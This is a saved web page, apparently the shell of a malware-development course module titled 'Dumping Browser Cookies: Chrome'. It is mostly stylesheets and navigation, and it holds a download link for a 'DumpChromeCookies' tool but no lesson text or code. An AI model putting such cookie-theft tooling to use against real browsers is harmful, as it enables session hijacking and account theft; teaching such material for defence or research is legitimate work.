f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="81_files/css2.css" rel="stylesheet">
        <link href="81_files/css2_002.css" rel="stylesheet">
        <title>Dumping Browser Cookies: Chrome</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="81_files/app-kkVsMfHl.css"><link rel="stylesheet" href="81_files/app-kkVsMfHl.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="81_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="81_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="e807be525e534f918c12df1ffa6e8a4b"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="81_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
    
  </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="81_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 81 - Dumping Browser Cookies: Chrome
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="81_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="81_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="81_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="81_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="81_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/DumpChromeCookies" target="_blank">
                    <img src="81_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
